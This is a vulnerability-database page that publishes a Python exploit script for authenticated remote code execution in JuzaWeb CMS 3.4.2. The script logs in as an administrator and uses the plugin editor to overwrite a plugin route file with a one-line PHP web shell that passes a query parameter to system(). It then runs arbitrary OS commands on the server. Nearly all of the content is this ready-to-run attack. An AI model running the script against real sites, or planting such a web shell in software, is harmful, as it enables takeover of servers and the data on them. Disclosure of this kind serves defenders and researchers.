---
title: JuzaWeb CMS 3.4.2 Authenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026050014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-19
fetch_date: 2026-05-20T05:58:32.443221
---

# JuzaWeb CMS 3.4.2 Authenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **JuzaWeb CMS 3.4.2 Authenticated Remote Code Execution** **2026.05.19**  Credit:  **[Sardor Shoakbarov](https://cxsecurity.com/author/Sardor%2BShoakbarov/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: JuzaWeb CMS 3.4.2 - Authenticated Remote Code Execution
# Date: 2026-01-10
# Exploit Author: Sardor Shoakbarov
# Author GitHub: https://github.com/TheDeepOpc
# Vendor Homepage: https://juzaweb.com/
# Software Link: https://github.com/juzaweb/
# CVE: N/A (Pending)
import requests
import argparse
from bs4 import BeautifulSoup
def run\_exploit():
parser = argparse.ArgumentParser(description='JuzaWeb Authenticated RCE')
# Setting up the exact syntax you requested
parser.add\_argument('-u', '--url', help='Target URL (e.g. http://127.0.0.1:8000)', required=True)
parser.add\_argument('-user', '--username', help='Admin Username/Email', required=True)
parser.add\_argument('-p', '--password', help='Admin Password', required=True)
parser.add\_argument('-cmd', '--command', help='OS Command to execute (e.g. "ls", "id")', required=True)
args = parser.parse\_args()
target = args.url.rstrip('/')
session = requests.Session()
print(f"[\*] Targeting: {target}")
# Step 1: Login
login\_url = f"{target}/admin-cp/login"
try:
get\_login = session.get(login\_url)
soup = BeautifulSoup(get\_login.text, 'html.parser')
token = soup.find('input', {'name': '\_token'})['value']
login\_data = {
'\_token': token,
'email': args.username,
'password': args.password
}
res = session.post(login\_url, data=login\_data)
if "Dashboard" not in res.text:
print("[-] Login failed. Check credentials.")
return
print("[+] Login Successful.")
except Exception as e:
print(f"[-] Error during login: {e}")
return
# Step 2: Inject Web Shell
# Injecting system() into a plugin file as described in the report
print("[\*] Injecting payload into Plugin Editor...")
editor\_url = f"{target}/admin-cp/plugins/editor"
shell\_payload = "<?php if(isset($\_GET['cmd'])) { system($\_GET['cmd']); die; } ?>"
inject\_data = {
'file': 'src/routes/api.php', # File to overwrite
'content': shell\_payload,
'plugin': 'juzaweb/example' # Targeted plugin
}
session.post(editor\_url, data=inject\_data)
# Step 3: Execute Command
# Accessing the modified route to trigger the command
print(f"[\*] Executing command: {args.command}")
exec\_url = f"{target}/admin-cp/plugins?cmd={args.command}"
response = session.get(exec\_url)
print("\n--- Output ---")
print(response.text.strip())
print("--------------")
if \_\_name\_\_ == "\_\_main\_\_":
run\_exploit()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top